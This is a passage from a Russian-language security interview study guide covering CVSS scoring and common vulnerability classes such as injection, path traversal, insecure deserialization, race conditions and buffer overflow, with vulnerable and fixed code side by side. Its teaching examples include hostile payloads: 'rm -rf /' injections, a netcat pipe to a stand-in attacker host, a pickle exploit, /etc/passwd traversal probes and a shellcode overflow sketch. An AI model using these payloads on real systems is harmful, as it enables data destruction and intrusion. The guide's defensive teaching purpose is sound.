   - Low (L) — частичная утечка
   - High (H) — полная утечка

7. **Integrity (I):**
   - None (N) — нет изменения
   - Low (L) — частичное изменение
   - High (H) — полное изменение

8. **Availability (A):**
   - None (N) — нет влияния
   - Low (L) — частичное влияние
   - High (H) — полное влияние

**Уровни серьёзности:**
- **0.0** — None (Нет)
- **0.1-3.9** — Low (Низкая)
- **4.0-6.9** — Medium (Средняя)
- **7.0-8.9** — High (Высокая)
- **9.0-10.0** — Critical (Критическая)

**Пример:**
```
CVE-2021-44228 (Log4j)
CVSS v3.1: 10.0 (Critical)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**Для чего применяется:**

1. **Приоритизация исправлений:**
   - Фокус на уязвимостях с высоким CVSS
   - Планирование ресурсов на исправление

2. **Управление рисками:**
   - Оценка рисков безопасности
   - Принятие решений о развёртывании

3. **Соответствие требованиям:**
   - Требования к устранению уязвимостей с CVSS > 7.0
   - Отчёты для аудита

4. **Коммуникация:**
   - Объяснение серьёзности уязвимостей
   - Информирование заинтересованных сторон

**Типы CVSS scores:**
- **Base Score** — базовый рейтинг, не меняется со временем
- **Temporal Score** — с учётом временных факторов (доступность патча, подтверждение уязвимости)
- **Environmental Score** — с учётом конкретной среды организации

---

### 132. Какие уязвимости относятся к реализации, а не к проектированию?

**Ответ:** Уязвимости, связанные с **реализацией (Implementation)** возникают из-за ошибок в коде при реализации, в то время как уязвимости проектирования связаны с архитектурными решениями.

**Уязвимости реализации:**

1. **SQL Injection (CWE-89):**
   - Неправильное использование параметризованных запросов
   - Прямая конкатенация пользовательского ввода в SQL

2. **Buffer Overflow (CWE-120, CWE-121):**
   - Использование небезопасных функций (strcpy, gets)
   - Отсутствие проверки размера буфера

3. **XSS (CWE-79):**
   - Отсутствие экранирования при выводе пользовательского ввода
   - Неправильное использование innerHTML вместо textContent

4. **Path Traversal (CWE-22):**
   - Отсутствие валидации путей к файлам
   - Использование пользовательского ввода без санитизации

5. **Command Injection (CWE-78):**
   - Использование os.system() с пользовательским вводом
   - Неправильное использование subprocess

6. **Improper Input Validation (CWE-20):**
   - Отсутствие валидации входных данных
   - Некорректная валидация

7. **Use After Free (CWE-416):**
   - Использование освобождённой памяти
   - Ошибки управления памятью

8. **Race Condition (CWE-362):**
   - Отсутствие синхронизации между потоками
   - Time-of-check-time-of-use (TOCTOU)

9. **Hardcoded Credentials (CWE-798):**
   - Хардкод паролей в коде
   - Хранение секретов в конфигурационных файлах

10. **Insecure Randomness (CWE-330):**
    - Использование предсказуемых генераторов случайных чисел
    - Неправильная инициализация генератора

**Отличия от уязвимостей проектирования:**

**Уязвимости проектирования:**
- Плохая архитектура безопасности
- Отсутствие механизмов аутентификации
- Неправильная модель контроля доступа
- Отсутствие шифрования на уровне архитектуры

**Уязвимости реализации:**
- Ошибки в коде
- Неправильное использование API
- Отсутствие проверок в коде
- Неправильная обработка ошибок

**Пример:**
```python
# УЯЗВИМОСТЬ РЕАЛИЗАЦИИ: Неправильное использование API
query = "SELECT * FROM users WHERE id = " + user_id  # SQL Injection

# БЕЗОПАСНАЯ РЕАЛИЗАЦИЯ
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

---

### 133. Какие уязвимости характерны для веб-приложений?

**Ответ:** Следующие уязвимости характерны для веб-приложений:

**1. Injection уязвимости:**
- **SQL Injection** — инъекция SQL-запросов
- **NoSQL Injection** — инъекция в NoSQL базы
- **Command Injection** — выполнение системных команд
- **LDAP Injection** — инъекция LDAP-запросов
- **XPath Injection** — инъекция XPath

**2. Cross-Site Scripting (XSS):**
- **Reflected XSS** — отражённый XSS
- **Stored XSS** — постоянный XSS
- **DOM-based XSS** — XSS через DOM

**3. Broken Access Control:**
- **IDOR** — Insecure Direct Object Reference
- **Privilege Escalation** — повышение привилегий
- **Missing Authorization** — отсутствие проверки прав

**4. Security Misconfiguration:**
- Открытые отладочные интерфейсы
- Небезопасная конфигурация сервера
- Раскрытие информации в заголовках

**5. Broken Authentication:**
- Слабая проверка паролей
- Небезопасное управление сессиями
- Утечка учётных данных

**6. Sensitive Data Exposure:**
- Нешифрованные данные
- Слабые алгоритмы шифрования
- Хранение паролей в открытом виде

**7. XXE (XML External Entity):**
- Внешние сущности в XML
- Чтение локальных файлов
- SSRF через XXE

**8. SSRF (Server-Side Request Forgery):**
- Подделка запросов сервера
- Доступ к внутренним ресурсам

**9. Insecure Deserialization:**
- Десериализация небезопасных данных
- Выполнение произвольного кода

**10. Insufficient Logging & Monitoring:**
    - Отсутствие логирования
    - Недостаточный мониторинг

**11. CORS Misconfiguration:**
    - Неправильная настройка CORS
    - Доступ к API с любых доменов

**12. Open Redirect:**
    - Редиректы на произвольные URL
    - Фишинг через редиректы

**13. CSRF (Cross-Site Request Forgery):**
    - Подделка запросов от имени пользователя
    - Выполнение действий без ведома пользователя

**14. Clickjacking:**
    - Наложение элементов на страницу
    - Обман пользователя для выполнения действий

**15. Session Management Issues:**
    - Небезопасные идентификаторы сессий
    - Неправильное время жизни сессии
    - Session Fixation

---

### 134. Какие уязвимости связаны с управлением сессиями?

**Ответ:** Уязвимости, связанные с управлением сессиями:

**1. Session Fixation (CWE-384):**
- Фиксация идентификатора сессии злоумышленником
- Принуждение пользователя использовать известный session ID
- Атака: злоумышленник получает session ID, заставляет пользователя войти, получает доступ

**2. Weak Session ID (CWE-330):**
- Предсказуемые идентификаторы сессий
- Последовательные или основанные на времени ID
- Легко угадываемые session tokens

**3. Session Hijacking:**
- Перехват идентификатора сессии
- Использование перехваченного session ID
- Атаки через XSS, network sniffing

**4. Long Session Timeout:**
- Слишком долгое время жизни сессии
- Сессии не истекают при бездействии
- Риск использования украденной сессии

**5. Session Not Invalidated on Logout:**
- Сессия не удаляется при выходе
- Session ID остаётся валидным после logout
- Возможность повторного использования

**6. Concurrent Session Control:**
- Отсутствие контроля одновременных сессий
- Пользователь может иметь множество активных сессий
- Невозможность отозвать все сессии

**7. Missing HttpOnly Flag:**
- Cookies доступны через JavaScript
- Возможность украсть через XSS
- Отсутствие защиты от XSS-атак

**8. Missing Secure Flag:**
- Cookies передаются по HTTP
- Возможность перехвата через сеть
- Отсутствие обязательного HTTPS

**9. SameSite Cookie Not Set:**
- Cookies отправляются в cross-site запросах
- Уязвимость к CSRF-атакам
- Отсутствие защиты от подделки запросов

**10. Session Storage in URL:**
    - Session ID в URL (GET параметры)
    - Утечка через логи, referrer
    - Видимость в истории браузера

**11. Session Replay:**
    - Отсутствие защиты от повторного использования токенов
    - Возможность повторной отправки запросов
    - Отсутствие nonce или timestamps

**12. Missing Session Regeneration:**
    - Session ID не меняется после аутентификации
    - Использование одного ID на протяжении сессии
    - Риск session fixation

**Примеры:**

```python
# УЯЗВИМО: Предсказуемый session ID
session_id = str(user_id) + str(time.time())  # Предсказуемо

# БЕЗОПАСНО: Случайный session ID
import secrets
session_id = secrets.token_urlsafe(32)

# УЯЗВИМО: Session не удаляется при logout
def logout():
    # Только очистка на клиенте
    response.delete_cookie('session_id')

# БЕЗОПАСНО: Удаление сессии на сервере
def logout():
    session_storage.delete(session_id)
    response.delete_cookie('session_id')

# УЯЗВИМО: Cookie без HttpOnly и Secure
response.set_cookie('session_id', session_id)

# БЕЗОПАСНО: Cookie с флагами
response.set_cookie(
    'session_id',
    session_id,
    httponly=True,
    secure=True,
    samesite='Strict'
)
```

---

### 135. Какие уязвимости могут возникнуть при неправильной обработке файлов?

**Ответ:** Уязвимости при неправильной обработке файлов:

**1. Path Traversal (Directory Traversal, CWE-22):**
- Обход ограничений доступа к файлам
- Доступ к файлам вне разрешённой директории
- Использование `../` для поднятия по директориям

**2. Unrestricted File Upload (CWE-434):**
- Загрузка произвольных файлов
- Загрузка исполняемых файлов
- Загрузка скриптов (PHP, JSP, ASP)

**3. Insecure File Permissions:**
- Файлы доступны всем пользователям
- Исполняемые файлы с неправильными правами
- Отсутствие контроля доступа к файлам

**4. File Inclusion (LFI/RFI):**
- **Local File Inclusion (LFI)** — включение локальных файлов
- **Remote File Inclusion (RFI)** — включение удалённых файлов
- Выполнение произвольного кода

**5. Zip Slip (CWE-29):**
- Path traversal при распаковке архивов
- Запись файлов вне целевой директории
- Использование путей с `../` в именах файлов

**6. Race Condition (TOCTOU):**
- Time-of-check-time-of-use
- Изменение файла между проверкой и использованием
- Символические ссылки (symlink attacks)

**7. Insecure Temporary Files:**
- Временные файлы с предсказуемыми именами
- Файлы доступны другим пользователям
- Отсутствие безопасного создания временных файлов

**8. Information Disclosure:**
- Раскрытие чувствительной информации через файлы
- Backup файлы доступны (.bak, .old, ~)
- Раскрытие путей, версий, конфигурации

**9. File Type Confusion:**
- Проверка типа файла только по расширению
- Отсутствие проверки magic bytes
- Загрузка опасных файлов с безопасным расширением

**10. Unsafe File Operations:**
    - Использование небезопасных функций
    - Отсутствие валидации имён файлов
    - Некорректная обработка специальных символов

**Примеры:**

```python
# УЯЗВИМО: Path Traversal
filename = request.args.get('file')
with open(filename, 'r') as f:  # Может открыть /etc/passwd
    content = f.read()

# БЕЗОПАСНО: Валидация пути
from pathlib import Path
BASE_DIR = Path("/var/www/uploads")
filepath = BASE_DIR / filename
if not filepath.resolve().is_relative_to(BASE_DIR.resolve()):
    raise ValueError("Invalid path")
with open(filepath, 'r') as f:
    content = f.read()

# УЯЗВИМО: Проверка только расширения
if filename.endswith('.jpg'):
    save_file(file)  # Может быть PHP скрипт с расширением .jpg

# БЕЗОПАСНО: Проверка magic bytes
import magic
mime_type = magic.from_buffer(file.read(), mime=True)
if mime_type != 'image/jpeg':
    raise ValueError("Invalid file type")
```

---

### 136. Какие уязвимости связаны с неправильным управлением зависимостями?

**Ответ:** Уязвимости, связанные с управлением зависимостями:

**1. Using Components with Known Vulnerabilities (CWE-1104):**
- Использование библиотек с известными уязвимостями
- Отсутствие обновлений зависимостей
- Использование устаревших версий

**2. Insecure Dependency Management:**
- Отсутствие фиксации версий
- Использование `latest` в зависимостях
- Отсутствие проверки целостности

**3. Supply Chain Attacks:**
- Компрометация зависимостей в процессе поставки
- Typosquatting (поддельные пакеты с похожими именами)
- Compromised packages в репозиториях

**4. Dependency Confusion:**
- Подмена внутренних пакетов публичными
- Загрузка вредоносных пакетов вместо внутренних
- Отсутствие приоритета внутренних репозиториев

**5. Unverified Dependencies:**
- Использование зависимостей без проверки
- Отсутствие сканирования на уязвимости
- Загрузка из ненадёжных источников

**6. License Violations:**
- Использование несовместимых лицензий
- Отсутствие проверки лицензий
- Нарушение требований лицензий

**7. Outdated Dependencies:**
- Использование устаревших версий
- Отсутствие обновлений безопасности
- Накопление технического долга

**8. Over-privileged Dependencies:**
- Зависимости с избыточными правами
- Выполнение зависимостей с высокими привилегиями
- Отсутствие принципа наименьших привилегий

**Примеры:**

```python
# УЯЗВИМО: Нефиксированные версии
# requirements.txt
requests  # Может обновиться до уязвимой версии

# БЕЗОПАСНО: Фиксированные версии
requests==2.28.2  # Конкретная версия

# УЯЗВИМО: Использование уязвимой библиотеки
# Известная уязвимость в log4j 2.0-2.14.1
# CVE-2021-44228 (Log4Shell)

# БЕЗОПАСНО: Обновление до безопасной версии
log4j-core==2.17.1  # Исправленная версия

# УЯЗВИМО: Загрузка из ненадёжного источника
pip install --index-url http://untrusted-repo.com/simple package

# БЕЗОПАСНО: Использование доверенных репозиториев
pip install --index-url https://pypi.org/simple package
```

**Меры защиты:**
- Регулярное сканирование зависимостей (SCA)
- Использование SBOM (Software Bill of Materials)
- Автоматическое обновление зависимостей
- Проверка цифровых подписей
- Использование lock-файлов

---

### 137. Что такое Open Redirect и к какому классу ошибок он относится?

**Ответ:** **Open Redirect (Открытое перенаправление)** — это уязвимость, при которой веб-приложение перенаправляет пользователя на URL, указанный в параметрах запроса, без проверки принадлежности URL к доверенному домену.

**Класс ошибок:**
Open Redirect относится к категории **A01:2021 – Broken Access Control** в OWASP Top 10 (2021), хотя в более ранних версиях мог быть частью категории **Unvalidated Redirects and Forwards**.

**CWE классификация:**
- **CWE-601** — URL Redirection to Untrusted Site ('Open Redirect')

**Как работает:**

1. **Пользователь переходит по ссылке:**
   ```
   https://example.com/redirect?url=http://evil.com/phishing
   ```

2. **Приложение выполняет редирект:**
   ```php
   header("Location: " . $_GET['url']);
   ```

3. **Пользователь перенаправляется на злонамеренный сайт**

**Угрозы:**

1. **Фишинг:**
   - Обман пользователей через поддельные сайты
   - Кражу учётных данных
   - Создание доверия к вредоносным ссылкам

2. **Обход фильтров:**
   - Обход URL-фильтров безопасности
   - Обход blacklist фильтров

3. **Утечка токенов:**
   - Токены в Referer заголовке
   - Утечка через query параметры

**Примеры уязвимого кода:**

```php
// PHP - УЯЗВИМО
header("Location: " . $_GET['url']);

// Python Flask - УЯЗВИМО
return redirect(request.args.get('url'))

// JavaScript - УЯЗВИМО
window.location.href = new URLSearchParams(location.search).get('url');
```

**Безопасная реализация:**

```php
// PHP - БЕЗОПАСНО
$allowed_domains = ['example.com', 'trusted-partner.com'];
$url = $_GET['url'];
$parsed = parse_url($url);

if (!in_array($parsed['host'], $allowed_domains)) {
    die("Domain not allowed");
}

header("Location: " . $url);
```

```python
# Python - БЕЗОПАСНО
ALLOWED_DOMAINS = ['example.com', 'trusted-partner.com']

def safe_redirect(url):
    parsed = urlparse(url)
    if parsed.netloc not in ALLOWED_DOMAINS:
        abort(400)
    return redirect(url)
```

**Меры защиты:**
- Whitelist разрешённых доменов
- Использование ID вместо URL для редиректов
- Относительные пути для внутренних редиректов
- Валидация и проверка всех URL перед редиректом

---

### 138. Что такое Command Injection и как её предотвратить?

**Ответ:** **Command Injection (CWE-78)** — это уязвимость, при которой злоумышленник может выполнить произвольные команды операционной системы на сервере через приложение.

**Как работает:**

Приложение использует пользовательский ввод для построения системных команд, которые выполняются на сервере. Злоумышленник может вставить дополнительные команды, которые также будут выполнены.

**Примеры уязвимого кода:**

```python
# УЯЗВИМО: Python
import os
filename = request.args.get('file')
os.system(f"cat {filename}")  # Команда: cat file.txt; rm -rf /

# УЯЗВИМО: PHP
$filename = $_GET['file'];
exec("ls " . $filename);  // Команда: ls file; rm -rf /
```

**Примеры атак:**

```bash
# Атака через разделитель команд
file.txt; rm -rf /

# Атака через &&
file.txt && cat /etc/passwd

# Атака через |
file.txt | nc attacker.com 4444

# Атака через backtick
file.txt `whoami`
```

**Как предотвратить:**

**1. Избегать выполнения команд:**
```python
# Вместо os.system() использовать безопасные альтернативы
import shutil
shutil.copy(src, dst)  # Вместо subprocess.run(['cp', src, dst])
```

**2. Использовать subprocess с параметрами:**
```python
# БЕЗОПАСНО: Передача аргументов списком
import subprocess
subprocess.run(['ls', '-l', filename])  # Безопасно

# ОПАСНО: Использование shell=True
subprocess.run(f"ls {filename}", shell=True)  # Уязвимо!
```

**3. Валидация и санитизация:**
```python
import re
import shlex

def safe_execute(filename):
    # Валидация: только безопасные символы
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename")
    
    # Экранирование через shlex
    safe_filename = shlex.quote(filename)
    subprocess.run(['cat', safe_filename])
```

**4. Whitelist разрешённых команд:**
```python
ALLOWED_COMMANDS = {
    'list': ['ls', '-l'],
    'count': ['wc', '-l']
}

def execute_command(command_name, *args):
    if command_name not in ALLOWED_COMMANDS:
        raise ValueError("Command not allowed")
    
    cmd = ALLOWED_COMMANDS[command_name].copy()
    cmd.extend(args)
    subprocess.run(cmd)
```

**5. Использование библиотек вместо команд:**
```python
# Вместо выполнения команды используйте библиотеки
import os
os.listdir('/path')  # Вместо subprocess.run(['ls', '/path'])
```

**6. Ограничение прав:**
```python
# Выполнение с ограниченными правами
subprocess.run(
    cmd,
    user='limited_user',  # Ограниченный пользователь
    timeout=5  # Таймаут
)
```

**Дополнительные меры:**
- Принцип наименьших привилегий
- Изоляция выполнения (chroot, containers)
- Логирование всех выполненных команд
- Статический анализ для поиска опасных функций

---

### 139. Что такое Path Traversal и как её обнаружить?

**Ответ:** **Path Traversal (Directory Traversal, CWE-22)** — это уязвимость, позволяющая злоумышленнику получить доступ к файлам и директориям, находящимся вне корневой директории веб-приложения.

**Как работает:**

Используя специальные последовательности (`../`, `..\\`) в путях к файлам, злоумышленник может подняться по директориям и получить доступ к произвольным файлам.

**Примеры атак:**

```
# Unix/Linux
../../../etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL-encoded)

# Windows
..\..\..\windows\system32\config\sam
....\\....\\windows\\system32\\config\\sam
```

**Уязвимый код:**

```python
# УЯЗВИМО
filename = request.args.get('file')
with open(f"/var/www/uploads/{filename}", 'r') as f:
    content = f.read()

# Атака: ?file=../../../etc/passwd
# Результат: открыт /etc/passwd
```

**Как обнаружить:**

**1. Статический анализ (SAST):**
- Поиск функций работы с файлами
- Поиск использования пользовательского ввода в путях
- Обнаружение отсутствия валидации путей

**2. Динамический анализ (DAST):**
- Тестирование с path traversal последовательностями
- Проверка доступа к системным файлам
- Использование сканеров уязвимостей

**3. Ручное тестирование:**
```bash
# Тестовые запросы
curl "http://example.com/download?file=../../../etc/passwd"
curl "http://example.com/download?file=....//....//etc/passwd"
curl "http://example.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**4. Автоматизированное сканирование:**
- Burp Suite
- OWASP ZAP
- SQLMap (для файловых операций в SQL)

**Защита:**

```python
from pathlib import Path

def safe_read_file(filename):
    # Базовая директория
    BASE_DIR = Path("/var/www/uploads").resolve()
    
    # Построение пути
    filepath = (BASE_DIR / filename).resolve()
    
    # Проверка, что путь внутри BASE_DIR
    try:
        filepath.relative_to(BASE_DIR)
    except ValueError:
        raise ValueError("Path traversal detected")
    
    # Дополнительная проверка
    if '..' in str(filepath):
        raise ValueError("Invalid path")
    
    with open(filepath, 'r') as f:
        return f.read()
```

**Признаки уязвимости:**
- Использование пользовательского ввода в путях
- Отсутствие нормализации путей
- Отсутствие проверки на `..`
- Использование небезопасных функций (file_get_contents, fopen)

---

### 140. Что такое CWE-89?

**Ответ:** **CWE-89** — это **SQL Injection** (SQL-инъекция) в классификации Common Weakness Enumeration.

**Описание:**
CWE-89 представляет собой слабость в программном обеспечении, при которой приложение генерирует SQL-запросы, используя пользовательский ввод без надлежащей валидации или экранирования, что позволяет злоумышленнику изменять логику запроса и выполнять произвольные SQL-команды.

**Характеристики:**
- **Категория:** Injection
- **Вероятность эксплуатации:** Высокая
- **Воздействие:** Критическое
- **Технологии:** Веб-приложения, базы данных

**Примеры:**

```python
# УЯЗВИМЫЙ КОД
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# Атака: ?id=1 OR 1=1 --
# Результирующий запрос: SELECT * FROM users WHERE id = 1 OR 1=1 --
```

**Последствия:**
- Чтение данных из базы данных
- Изменение или удаление данных
- Обход аутентификации
- Выполнение административных операций

**Меры защиты:**
- Использование параметризованных запросов
- ORM (Object-Relational Mapping)
- Валидация входных данных
- Принцип наименьших привилегий для БД

**Статистика:**
- Входит в CWE Top 25
- Очень распространённая уязвимость
- Высокая критичность

---

### 141. Что такое CWE-78?

**Ответ:** **CWE-78** — это **OS Command Injection** (Инъекция команд операционной системы) в классификации Common Weakness Enumeration.

**Описание:**
CWE-78 представляет собой слабость, при которой приложение включает пользовательский ввод в системную команду операционной системы без надлежащей валидации или экранирования, что позволяет злоумышленнику выполнить произвольные команды на сервере.

**Характеристики:**
- **Категория:** Injection
- **Вероятность эксплуатации:** Средняя-Высокая
- **Воздействие:** Высокое-Критическое
- **Технологии:** Все языки программирования

**Примеры:**

```python
# УЯЗВИМЫЙ КОД
import os
filename = request.args.get('file')
os.system(f"cat {filename}")

# Атака: ?file=/etc/passwd; rm -rf /
# Выполнится: cat /etc/passwd; rm -rf /
```

**Последствия:**
- Выполнение произвольных команд на сервере
- Компрометация сервера
- Доступ к файловой системе
- Запуск вредоносного кода

**Меры защиты:**
- Использование API вместо команд
- Валидация и санитизация входных данных
- Использование subprocess с параметрами (без shell)
- Whitelist разрешённых команд

---

### 142. Что такое CWE-22?

**Ответ:** **CWE-22** — это **Path Traversal** (Обход пути, Directory Traversal) в классификации Common Weakness Enumeration.

**Описание:**
CWE-22 представляет собой слабость, при которой приложение использует внешний ввод для построения пути к файлу или директории без ограничений, что позволяет злоумышленнику получить доступ к файлам и директориям вне предполагаемой ограниченной директории.

**Характеристики:**
- **Категория:** Input Validation
- **Вероятность эксплуатации:** Средняя
- **Воздействие:** Среднее-Высокое
- **Технологии:** Веб-приложения, файловые системы

**Примеры:**

```python
# УЯЗВИМЫЙ КОД
filename = request.args.get('file')
with open(f"/var/www/uploads/{filename}", 'r') as f:
    content = f.read()

# Атака: ?file=../../../etc/passwd
# Результат: открыт /etc/passwd
```

**Последствия:**
- Чтение произвольных файлов
- Доступ к системным файлам
- Утечка конфиденциальной информации
- Раскрытие исходного кода

**Меры защиты:**
- Валидация и нормализация путей
- Использование базовой директории
- Проверка относительных путей
- Whitelist разрешённых файлов

---

### 143. Какие уязвимости относятся к insecure deserialization?

**Ответ:** Уязвимости, связанные с **insecure deserialization** (небезопасной десериализацией):

**1. Deserialization of Untrusted Data (CWE-502):**
- Десериализация данных от ненадёжных источников
- Выполнение произвольного кода при десериализации
- Изменение логики приложения

**2. Unsafe Deserialization:**
- Десериализация без валидации
- Отсутствие контроля над десериализуемыми объектами
- Использование небезопасных форматов (pickle, YAML)

**3. Object Injection:**
- Инъекция произвольных объектов
- Изменение поведения приложения
- Обход механизмов безопасности

**4. Remote Code Execution через десериализацию:**
- Выполнение кода при десериализации
- Загрузка произвольных классов
- Вызов опасных методов

**Примеры:**

```python
# УЯЗВИМО: Python pickle
import pickle
data = request.data
obj = pickle.loads(data)  # Может выполнить произвольный код!

# Пример вредоносного объекта
class Malicious:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

# БЕЗОПАСНО: Использование JSON
import json
obj = json.loads(data)  # Безопасно, не выполняет код
```

```python
# УЯЗВИМО: PHP unserialize
$data = $_POST['data'];
$obj = unserialize($data);  # Может выполнить произвольный код

# БЕЗОПАСНО: JSON
$obj = json_decode($_POST['data'], true);
```

**Последствия:**
- Выполнение произвольного кода (RCE)
- Обход аутентификации
- Изменение данных приложения
- DoS через потребление ресурсов

**Меры защиты:**
- Использование безопасных форматов (JSON вместо pickle)
- Валидация перед десериализацией
- Whitelist разрешённых классов
- Изоляция процесса десериализации
- Использование цифровых подписей

---

### 144. Какие уязвимости связаны с неправильной конфигурацией (Security Misconfiguration)?

**Ответ:** Уязвимости, связанные с **Security Misconfiguration** (небезопасной конфигурацией):

**1. Отладочные интерфейсы в production:**
- Включённый debug mode
- Отладочные порты открыты
- Консоли разработчика доступны

**2. Небезопасная конфигурация сервера:**
- Отсутствие HTTPS
- Слабые алгоритмы шифрования
- Отсутствие security headers

**3. Раскрытие информации:**
- Версии в HTTP заголовках
- Стек технологий в заголовках
- Детальные сообщения об ошибках

**4. Небезопасные права доступа:**
- Файлы с правами 777
- Неправильные права на директории
- Чувствительные файлы доступны всем

**5. Небезопасная конфигурация базы данных:**
- Учётные записи по умолчанию
- Слабые пароли
- Публичный доступ к БД

**6. Небезопасная конфигурация облачных сервисов:**
- Публичные S3 buckets
- Открытые порты в Security Groups
- Неправильные IAM политики

**7. Отсутствие обновлений:**
- Устаревшие зависимости
- Отсутствие security patches
- Использование EOL версий

**8. Небезопасная конфигурация веб-сервера:**
- Отсутствие WAF
- Неправильная конфигурация CORS
- Отсутствие rate limiting

**Примеры:**

```python
# УЯЗВИМО: Debug mode в production
app.run(debug=True, host='0.0.0.0')

# БЕЗОПАСНО
app.run(debug=False, host='127.0.0.1')
```

```nginx
# УЯЗВИМО: Раскрытие версий
server {
    server_tokens on;  # Раскрывает версию Nginx
}

# БЕЗОПАСНО
server {
    server_tokens off;  # Скрывает версию
}
```

**Категория OWASP Top 10:**
- **A05:2021 – Security Misconfiguration**

**Меры защиты:**
- Автоматизированные проверки конфигурации
- Безопасные конфигурации по умолчанию
- Регулярные аудиты конфигурации
- Минимализация конфигурации
- Документирование конфигурации

---

### 145. Что такое race condition и как она возникает?

**Ответ:** **Race Condition (CWE-362)** — это уязвимость, при которой результат выполнения программы зависит от относительного порядка выполнения операций, выполняемых параллельно или в определённой последовательности.

**Как возникает:**

Race condition возникает, когда:
1. Два или более потока/процесса обращаются к одному ресурсу
2. Операции не атомарны (не выполняются как одно целое)
3. Результат зависит от порядка выполнения

**Типы race conditions:**

**1. Time-of-check-time-of-use (TOCTOU):**
```python
# УЯЗВИМО
if os.path.exists(filename):
    # Между проверкой и использованием файл может быть изменён
    time.sleep(1)  # Симуляция задержки
    with open(filename, 'r') as f:  # Файл может быть удалён или изменён
        content = f.read()
```

**2. Check-then-act:**
```python
# УЯЗВИМО: Проверка баланса и снятие
balance = account.get_balance()
if balance >= amount:
    time.sleep(1)  # Другой поток может изменить баланс
    account.withdraw(amount)  # Может снять больше, чем есть
```

**3. File-based race condition:**
```python
# УЯЗВИМО: Создание временного файла
temp_file = f"/tmp/{user_id}.tmp"
if not os.path.exists(temp_file):
    # Между проверкой и созданием другой процесс может создать файл
    with open(temp_file, 'w') as f:
        f.write(data)
```

**Примеры уязвимостей:**

**1. Authentication bypass:**
```python
# УЯЗВИМО
if not user.is_locked():
    attempts = user.login_attempts
    attempts += 1
    user.login_attempts = attempts
    if attempts > 5:
        user.lock()
    # Между проверкой и блокировкой другой запрос может пройти
```

**2. File upload race:**
```python
# УЯЗВИМО
if not os.path.exists(filename):
    # Файл может быть создан другим процессом
    with open(filename, 'w') as f:
        f.write(user_content)
```

**Защита:**

**1. Синхронизация (Locks):**
```python
import threading

lock = threading.Lock()

def safe_operation():
    with lock:
        # Критическая секция
        balance = account.get_balance()
        if balance >= amount:
            account.withdraw(amount)
```

**2. Атомарные операции:**
```python
# БЕЗОПАСНО: Атомарное обновление
account.withdraw_atomic(amount)  # Проверка и снятие в одной операции
```

**3. Транзакции:**
```python
# БЕЗОПАСНО: Использование транзакций БД
with db.transaction():
    balance = account.get_balance()
    if balance >= amount:
        account.withdraw(amount)
```

**4. Идемпотентность:**
```python
# БЕЗОПАСНО: Идемпотентные операции
result = operation()  # Безопасно повторять
```

---

### 146. Что такое buffer overflow и к какому классу ошибок он относится?

**Ответ:** **Buffer Overflow (CWE-120, CWE-121)** — это уязвимость, при которой программа записывает данные за пределы выделенного буфера памяти, что может привести к перезаписи соседней памяти и выполнению произвольного кода.

**Класс ошибок:**
Buffer Overflow относится к категории **Memory Safety** и **Out-of-bounds Write**.

**CWE классификация:**
- **CWE-120** — Buffer Copy without Checking Size of Input
- **CWE-121** — Stack-based Buffer Overflow
- **CWE-122** — Heap-based Buffer Overflow
- **CWE-124** — Buffer Underwrite

**Типы:**

**1. Stack-based Buffer Overflow:**
```c
// УЯЗВИМО
void vulnerable_function(char *input) {
    char buffer[256];
    strcpy(buffer, input);  // Нет проверки размера
    // Если input длиннее 256, перезапишет стек
}
```

**2. Heap-based Buffer Overflow:**
```c
// УЯЗВИМО
char *buffer = malloc(256);
strcpy(buffer, large_input);  // Перезапись heap
```

**3. Integer Overflow:**
```c
// УЯЗВИМО
int size = length1 + length2;  // Может переполниться
char *buffer = malloc(size);
```

**Последствия:**
- Выполнение произвольного кода
- Обход механизмов безопасности
- DoS (отказ в обслуживании)
- Изменение поведения программы

**Примеры атак:**

```c
// Классическая атака через переполнение стека
char payload[300];
memset(payload, 'A', 256);  // Заполнение буфера
strcat(payload, "\x41\x41\x41\x41");  // Перезапись return address
strcat(payload, shellcode);  // Код для выполнения
vulnerable_function(payload);
```

**Защита:**

**1. Использование безопасных функций:**
```c
// БЕЗОПАСНО
char buffer[256];
strncpy(buffer, input, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';
```

**2. Проверка размера:**
```c
// БЕЗОПАСНО
if (strlen(input) >= sizeof(buffer)) {
    return ERROR_TOO_LONG;
}
strcpy(buffer, input);
```

**3. Защитные механизмы компилятора:**
- Stack canaries
- ASLR (Address Space Layout Randomization)
- DEP/NX (Data Execution Prevention)
- Stack Guard

**4. Языки с безопасностью памяти:**
- Python, Java, Rust — автоматическая проверка границ
- Управление памятью компилятором/интерпретатором

---

### 147. Какие уязвимости связаны с использованием небезопасных криптографических алгоритмов?

**Ответ:** Уязвимости, связанные с небезопасными криптографическими алгоритмами:

**1. Использование устаревших алгоритмов:**
- **MD5** — устарел, небезопасен
- **SHA-1** — устарел, найден collision
- **DES** — слишком короткий ключ (56 бит)
- **RC4** — небезопасен для использования

**2. Слабые алгоритмы шифрования:**
- **3DES** — устарел
- **Blowfish** — короткий блок (64 бит)
- **IDEA** — устарел

**3. Небезопасные режимы шифрования:**
- **ECB (Electronic Codebook)** — небезопасен, одинаковые блоки дают одинаковый шифротекст
- **CBC без проверки целостности** — уязвим к padding oracle attacks

**4. Слабые ключи:**
- Короткие ключи (< 128 бит для симметричных)
- Предсказуемые ключи
- Хардкод ключей в коде

**5. Небезопасная генерация случайных чисел:**
- Использование rand() вместо криптографически стойких генераторов
- Предсказуемые seed
- Недостаточная энтропия

**6. Небезопасное хеширование паролей:**
- MD5, SHA-1 для паролей
- Отсутствие salt
- Недостаточное количество итераций

**7. Небезопасные протоколы:**
- SSL 2.0/3.0 — устарели
- TLS 1.0/1.1 — устарели (рекомендуется TLS 1.2+)
- Небезопасные cipher suites

**Примеры:**

```python
# УЯЗВИМО: Использование MD5
import hashlib
hash = hashlib.md5(password).hexdigest()  # Небезопасно!

# БЕЗОПАСНО: Использование bcrypt
import bcrypt
hash = bcrypt.hashpw(password, bcrypt.gensalt())

# УЯЗВИМО: Слабый ключ
key = "secret123"  # Слишком короткий и простой

# БЕЗОПАСНО: Генерация ключа
import secrets
